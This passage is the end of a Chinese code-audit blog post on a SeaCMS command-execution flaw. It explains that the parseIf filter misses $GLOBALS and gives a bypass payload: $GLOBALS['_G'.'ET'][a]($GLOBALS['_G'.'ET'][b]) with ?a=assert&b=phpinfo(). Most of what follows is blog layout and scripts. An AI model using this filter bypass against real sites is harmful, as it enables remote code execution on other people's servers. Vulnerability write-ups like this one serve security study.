+<p>在前面的分析中，我们知道<code>parseIf</code>函数中添加过滤了<code>assert</code>和<code>_SERVER</code>，但是还有个全局变量<code>$GLOBALS</code>未被过滤，它一个包含了全部变量的全局组合数组，变量的名字就是数组的键。也就是说<code>$GLOBALS[&#39;_GET&#39;]</code>就相当于<code>$_GET</code> ，那么<code>$GLOBALS[&#39;_G&#39;.&#39;ET&#39;][a]</code>就相当于<code>$_GET[&#39;a&#39;]</code>，<code>$GLOBALS[&#39;_G&#39;.&#39;ET&#39;][a]($GLOBALS[&#39;_G&#39;.&#39;ET&#39;][b]);</code>，<code>?a=assert&amp;b=phpinfo();</code>就相当于<code>assert(phpinfo(););</code></p>
+<p>最后附上参考链接的总结图：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/seacms/12.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2019-04-06T02:49:11.598Z" itemprop="dateUpdated">2019-04-06 10:49:11</time>
+</span>
+
+
+        
+        原文链接：<a href="/posts/10257/" target="_blank" rel="external">https://Foxgrin.github.io/posts/10257/</a>
+        
+    </div>
+    <footer>
+        <div onclick="location.href='https://Foxgrin.github.io'">
+            <img src="/img/touxiang/1.jpg" alt="Somnus">
+            <a>Somnus</a>
+        </div>
+    </footer>
+</blockquote>
+
+        
+    <div class="page-reward">
+        <nav class="myreward">
+            <a id="rewardBtn" href="javascript:;"><span>打&nbsp;赏</span><span>装成好像很多人打赏的样子</span></a>
+        </nav>
+    </div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://Foxgrin.github.io/posts/10257/&title=《代码审计--seacms命令执行漏洞（6.45后续版本）》 — Somnus's blog&pic=https://Foxgrin.github.io/img/touxiang/1.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://Foxgrin.github.io/posts/10257/&title=《代码审计--seacms命令执行漏洞（6.45后续版本）》 — Somnus's blog&source=继续跟踪海洋cms 6.45后续版本是否修复命令执行漏洞" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://Foxgrin.github.io/posts/10257/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《代码审计--seacms命令执行漏洞（6.45后续版本）》 — Somnus's blog&url=https://Foxgrin.github.io/posts/10257/&via=https://Foxgrin.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://Foxgrin.github.io/posts/10257/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/posts/52899/" id="post-prev" class="post-nav-link">
+        <h4 class="title" >
+          上一篇：ringzer0ctf-sql注入
+        </h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/posts/23000/" id="post-next" class="post-nav-link">
+        <h4 class="title" data-hover="下一篇：代码审计--seacms6.45前台getshell">下一篇：代码审计--seacms6.45前台getshell</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+    
+
+    
+
+    
+
+
+</article>
+
+</div>
+
+        <footer class="footer">
+    <div class="footer-content">
+        <span class="power">
+            <i class="icon icon-lg icon-copyright"></i>
+            2018
+            <i class="icon icon-lg icon-heart"></i>
+            <a href="https://Foxgrin.github.io">Somnus</a>
+            <br/>
+            Power by
+            <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a>&nbsp;·&nbsp;
+            Theme
+            <a class="tomotoeslink" href="https://github.com/tomotoes/hexo-theme-tomotoes/" target="_blank" rel="external nofollow">tomotoes</a>
+        </span>
+
+        <br/>
+
+        <span id="RunTime" style="color:#a7a7a2;"></span>
+        <br/>
+
+        <span>
+            
+	<i class="icon icon-lg icon-user">
+<span id="busuanzi_container_site_uv" style='display:none'>
+       访问用户：<span id="busuanzi_value_site_uv"></span>
+    </span>人</i>
+    ·
+    <i class="icon icon-lg icon-eye">
+    <span id="busuanzi_container_site_pv" style='display:none'>
+      访问次数：<span id="busuanzi_value_site_pv"></span>
+    </span>次
+    </i>
+
+
+        </span>
+        <br/>
+
+        <span class="license">This blog is licensed under a <a rel="license" rel="external nofollow" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span>
+    </div>
+</footer>
+
+    </main>
+    
+        
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        <span>感谢您的鼓励支持！</span>
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" data-img="/img/dog.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/weixin.png" data-alipay="/img/zhifubao.png">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechatPay">&nbsp;&nbsp;微信&nbsp;&nbsp;</span>
+                <span class="reward-toggle-item alipayPay">支付宝</span>
+            </div>
+        </label>
+        
+        <i class="icon icon-caret-up"></i>
+    </div>
+</div>
+
+
+    
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://Foxgrin.github.io/posts/10257/&title=《代码审计--seacms命令执行漏洞（6.45后续版本）》 — Somnus's blog&pic=https://Foxgrin.github.io/img/touxiang/1.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://Foxgrin.github.io/posts/10257/&title=《代码审计--seacms命令执行漏洞（6.45后续版本）》 — Somnus's blog&source=继续跟踪海洋cms 6.45后续版本是否修复命令执行漏洞" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://Foxgrin.github.io/posts/10257/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《代码审计--seacms命令执行漏洞（6.45后续版本）》 — Somnus's blog&url=https://Foxgrin.github.io/posts/10257/&via=https://Foxgrin.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://Foxgrin.github.io/posts/10257/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p class="wechatshare">扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAABwklEQVR42u3aQY7DIAwF0Nz/0pkDtE2/DXEz0mNVKSk8srCwzXHE43wZn955ff96tuOOgYuLu8w9L8enBaqL5fN/+TS4uLiD3CQwrYSt60CW/xcXF/fJ3OqbSSDDxcX979xPT5M0qbpJXFzcX3GrgSZJfq7nuT1Xw8XFXeDmRY37ft9S38XFxW1xz+LoFVh777z5Fy4u7gh3/bCSH0p6zRhcXNxfcauljZWneTnmywy4uLi3cdcX613VahZHcHFxx7m95KdKzMugb7aEi4s7ws2PHTlrvfIZJT+4uLgj3OS4U017er2dcq6Gi4u7lZuHj+oViuo3i8qsuLi4I9xddx6qoXB9Zlxc3EluNUj1Alnedi33f3BxcTdx8/bGSgKzUnA5qucvXFzcTdwcl6cueeKUBztcXNwncPMSyXpYjJIfXFzccW5+lqiyekecwmNcXNxN3LM4eu3Y5BNEm8HFxR3h9socvYUT+oYmKy4u7iZuNXgl0N5FrkK3BxcXd4RbbmnEl66qEbRQMMXFxX0wt7xkcaubAxkuLu4N3PWrliubx8XFneQmC/eubOYJVdTKxcXFHeHuPbLkM1QbPLi4uCPcPxaxw0LQVKT4AAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <!-- waves按钮特效 -->
+<script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<!-- 主题配置脚本 -->
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+</script>
+
+<!-- jquery -->
+<script src="/js/jquery.min.js?v=3.0"></script>
+
+<!-- 搜索 -->
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item waves-block waves-effect" onclick="location.href='{path}'">
+    <div class="title ellipsis" title="{title}">{title}</div>
+</li>
+</template>
+
+
+<!-- main博客脚本 -->
+<script src="/js/main.min.js?v=3.0" ></script>
+
+<!-- 动画&配置 -->
+<script src="/js/script.min.js?v=3.0" ></script>
+
+<!-- 脚本管理 -->
+<script>
+
+if(window.innerWidth > 800){
+	/* 3D标题 */
+	$(".content-header").on("mousemove", threedee);
+
+	/* 底部追随鼠标 */
+	$(".footer").hover(2);
+
+	/* gotop键的涟漪 */
+	$("#gotop").hover(1);
+
+	/* 赞赏的粒子雨 */
+	$("#reward").hover(3);
+
+	/* 微信公众号的底部渲染 */
+	$("#wechat").hover(4);
+
+    /* 标题跳动 */
+    $(".archivestitle").bumpyText();
+
+	/* 图片点击放大 */
+	const postimg = jQuery(".post-content img:not(.github-emoji)");
+	postimg.on("click",function(){
+
+		mask.classList.add("in");
+		main.classList.add("Mask");
+		menu.classList.add("Mask");
+		var myimg = this.cloneNode(true);
+		myimg.classList.add("imgShow");
+
+		setTimeout(function(){
+			jQuery(myimg).animate({
+				opacity:"1"
+			},1000);
+		},0);
+
+		document.body.appendChild(myimg);
+
+		myimg.onclick=function(){
+			document.body.removeChild(myimg);
+			mask.classList.remove("in");
+			main.classList.remove("Mask");
+			menu.classList.remove("Mask");
+		};
+
+	});
+
+}
+
+/* 名字跳动 */
+$("#name").bumpyText();
+
+
+/* 网站运行时间 */
+setInterval(function () {
+	setTime("2018/7/9");
+}, 1000);
+
+/* 文章块的淡出 */
+postshow();
+
+/* 座右铭 */
+
+   getHitokoto();
+
+
+
+/* 粘贴提示 */
+G($(".post-content"), location.href, "Somnus");
+
+
+/* 控制台 */
+if (window.console && window.console.log) {
+	setTimeout(function () {
+		console.log("\n %c 一个坏掉的番茄 %c  © Simon Ma  http://tomotoes.com \n\n", "color:#FFFFFB;background:#1abc9c;padding:5px 0;border-radius:.5rem 0 0 .5rem;", "color:#FFFFFB;background:#080808;padding:5px 0;border-radius:0 .5rem .5rem 0;");
+	}, 0);
+}
+
+</script>
+
+
+
+
+<!-- 公式渲染 -->
+
+
+
+<!-- 不蒜子 -->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+</body>
+</html>
